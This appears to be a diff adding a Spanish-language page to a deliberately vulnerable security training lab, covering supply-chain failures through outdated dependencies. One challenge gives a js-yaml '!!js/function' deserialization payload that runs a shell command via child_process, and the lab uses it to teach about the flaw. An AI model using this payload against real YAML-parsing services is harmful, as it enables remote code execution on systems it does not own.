@@ -1,0 +1,18 @@
+extends ../layout
+include ../mixins/lab.pug
+
+block content
+  +labHeader('A03', 'Fallos en la Cadena de Suministro')
+  .card
+    .card-body
+      h5.card-title Concepto
+      p.card-text Las dependencias desactualizadas y sin verificar son una puerta de entrada frecuente.
+      h6.text-secondary.text-uppercase.small Retos
+      ol
+        li Ve a #[a(href="/a03/audit") /a03/audit] o ejecuta #[code npm audit] en la terminal. Identifica el CVE de #[code js-yaml@3.13.0].
+        li
+          | Ve a #[a(href="/a03/parse-config") /a03/parse-config] y envía:
+          pre: code.
+            !!js/function 'function (){ return process.mainModule.require("child_process").execSync("touch /tmp/yaml_pwned") }'
+          | Verifica con #[code ls /tmp/yaml_pwned].
+        li Ve a #[a(href="/a03/install-plugin") /a03/install-plugin] e instala cualquier plugin. ¿Se verifica algún hash o firma?
